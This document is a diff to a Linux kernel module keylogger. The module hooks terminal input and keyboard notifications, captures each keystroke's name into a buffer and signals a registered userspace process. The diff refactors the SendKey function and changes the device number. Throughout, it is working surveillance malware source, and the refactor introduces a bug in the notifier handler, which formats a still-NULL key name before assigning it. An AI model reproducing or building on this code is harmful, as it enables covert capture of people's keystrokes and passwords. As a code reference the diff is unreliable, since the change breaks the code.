@@ -21,7 +21,7 @@
 
 #define print812(...) printk( "<1>812 " ); printk( __VA_ARGS__ ); printk( "\n" );
 
-#define KEYLOG_MAJOR 60
+#define KEYLOG_MAJOR 65
 #define KEYLOG_NAME  "keylog"
 
 #define KEYLOG_BUF_SIZE 32
@@ -116,10 +116,11 @@ struct file* file_open(const char* path, int flags, int rights) {
     return filp;   
 }
 
-void SendKey(char* keyString)
+void SendKey()
 {
-    cur_buf_length = sprintf( key_buffer, "%s", key_name );
-        
+    struct siginfo     *sinfo;    /* signal information */
+    struct task_struct *task;
+
     sinfo = kzalloc( sizeof(struct siginfo), GFP_KERNEL );
     if ( sinfo == NULL ) {
         print812( "Failed to allocate siginfo for signal sending" );
@@ -143,11 +144,8 @@ void SendKey(char* keyString)
 
 void new_receive_buf(struct tty_struct *tty, const unsigned char *cp, char *fp, int count)
 {   
-    char *key_name = NULL; 
+    const char *key_name = NULL; 
     int startBuffering = registered_pid >= 0; // Don't buffer unless someone is listening
-
-    struct siginfo     *sinfo;    /* signal information */
-    struct task_struct *task;
 
     if(startBuffering && (count > 0))
     {
@@ -157,8 +155,11 @@ void new_receive_buf(struct tty_struct *tty, const unsigned char *cp, char *fp, 
             strncpy(dstStr, cp, count);
             dstStr[count] = '\0';
             
-            char* key_name = get_tty_key_str(dstStr, count);
-            SendKey( key_name );
+            key_name = get_tty_key_str(dstStr, count);
+
+            cur_buf_length = sprintf( key_buffer, "%s", key_name );
+            
+            SendKey();
         }
     }
 
@@ -171,12 +172,11 @@ int hello_notify(struct notifier_block *nblock, unsigned long code, void *_param
     char *key_name = NULL; 
     int startBuffering = registered_pid >= 0; // Don't buffer unless someone is listening
 
-    struct siginfo     *sinfo;    /* signal information */
-    struct task_struct *task;
+    cur_buf_length = sprintf( key_buffer, "%s", key_name );
 
     if ( code == KBD_KEYCODE && param->down && startBuffering ) {
         key_name = GET_KEYNAME( param->value );
-        SendKey( key_name );
+        SendKey();
 
         // print812( "Keycode %i %s\n", param->value, (param->down ? "down" : "up") );
     }
